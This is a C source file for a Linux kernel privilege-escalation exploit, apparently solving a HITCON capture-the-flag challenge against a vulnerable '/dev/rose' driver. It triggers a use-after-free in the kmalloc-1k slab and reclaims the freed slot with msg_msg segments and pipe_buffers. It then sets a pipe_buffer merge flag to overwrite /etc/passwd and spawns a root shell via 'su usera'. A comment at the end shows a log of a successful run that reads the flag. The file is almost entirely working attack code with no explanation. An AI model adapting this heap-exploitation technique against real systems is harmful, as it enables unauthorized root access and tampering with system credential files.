#include "./exploit.h"

#define DEV "/dev/rose"

int fd[3];
int passwdfd;
int pipefd[2];

typedef struct 
{
        long mtype;
        char mtext[0x1500];
} msg_t;

struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	void *ops;
	unsigned int flags;
	unsigned long private;
};

int main(){
    info("Opening device");
    for (int i = 0; i < 3; i++)
        fd[i] = open(DEV, O_RDONLY);

    info("Triggering UAF on kmalloc-1k");
    close(fd[0]);


    info("Acquiring UAF slab with msg_msgseg");
    msg_t msg;
    msg.mtype = 0x1337;
    memset(msg.mtext, 0x41, 0x1400);
    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    msgsnd(qid, &msg, PAGE + 0x337 - 0x38, 0);  // msg_msg in 4k slab and msg_msg_seg in the next 0x400 bytes, 1k slab
    info("Freeing struct msg_msg_seg");
    close(fd[1]);


    info("Acquiring free'd msg_msg_seg with pipe_buffers");
    char buf[PAGE];
    memset(buf, 0x42, 0x400);
    pipe(pipefd);
    write(pipefd[1], buf, PAGE);

    info("Freeing pipe_buffer");
    close(fd[2]);

    info("zeroing out 1k slab");
    memset(buf, 0x0, 0x400);
    setxattr("/dev/null", "a", buf, 0x400, 0);
    open(DEV, O_RDONLY);    // Allocating 1k slab again, bc msgrcv frees the slab
    // int qid2 = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    // msg_t msg2;
    // msg2.mtype = 0x1337;
    // memset(msg2.mtext, 0x45, 0x1400);
    // msgsnd(qid2, &msg2, PAGE + 0x200 - 0x38 + 0x50, 0);
    // write(pipefd[1], buf, 0x100);

    info("Splicing pipe with passwd fd");
    if ((passwdfd = open("/etc/passwd", O_RDONLY)) < 0) perror("open");;
    info("passwd fd: %d", passwdfd);
    splice(passwdfd, 0, pipefd[1], 0, 1, 0);

    info("Reading /etc/passwd's pipe_buffer");
    if (msgrcv(qid, msg.mtext, 0x1400, 0, MSG_NOERROR) == -1) err("msgrcv");
    
    int pipebuf_offset = 0x1000-0x8;
    struct pipe_buffer *pipebuf = &msg.mtext[pipebuf_offset];

    info("Overwriting passwd's pipe_buffer->flags");
    pipebuf->flags |= 0x10;
    pipebuf->offset = -1;
    // examine(&msg.mtext[pipebuf_offset], 0x10);
    memset(&msg.mtext[PAGE-0x30], 0, 8);
    setxattr("/etc/hosts", "a", &msg.mtext[PAGE-0x30], 0x400, 0);

    info("Overwriting /etc/passwd content");
    write(pipefd[1], "usera:", 6);

    // system("cat /etc/passwd");
    system("su usera");
    return 0;
}

/*
 ___       __   ________  ___       ___               ________  ________  ________  _______      
|\  \     |\  \|\   __  \|\  \     |\  \             |\   __  \|\   __  \|\   ____\|\  ___ \     
\ \  \    \ \  \ \  \|\  \ \  \    \ \  \            \ \  \|\  \ \  \|\  \ \  \___|\ \   __/|    
 \ \  \  __\ \  \ \   __  \ \  \    \ \  \            \ \   _  _\ \  \\\  \ \_____  \ \  \_|/__  
  \ \  \|\__\_\  \ \  \ \  \ \  \____\ \  \____        \ \  \\  \\ \  \\\  \|____|\  \ \  \_|\ \ 
   \ \____________\ \__\ \__\ \_______\ \_______\       \ \__\\ _\\ \_______\____\_\  \ \_______\
    \|____________|\|__|\|__|\|_______|\|_______|        \|__|\|__|\|_______|\_________\|_______|
                                                                            \|_________|         
/home/user $ hack
[ > Opening device
[ > Triggering UAF on kmalloc-1k
[ > Acquiring UAF slab with msg_msgseg
[ > Freeing struct msg_msg_seg
[ > Acquiring free'd msg_msg_seg with pipe_buffers
[ > Freeing pipe_buffer
[ > zeroing out 1k slab
[ > Splicing pipe with passwd fd
[ > passwd fd: 6
[ > Reading /etc/passwd's pipe_buffer
[ > Overwriting passwd's pipe_buffer->flags
[ > Overwriting /etc/passwd content
/home/user # cat flag
hitcon{???????????????????????????????????????????????????????????????}
/home/user #
*/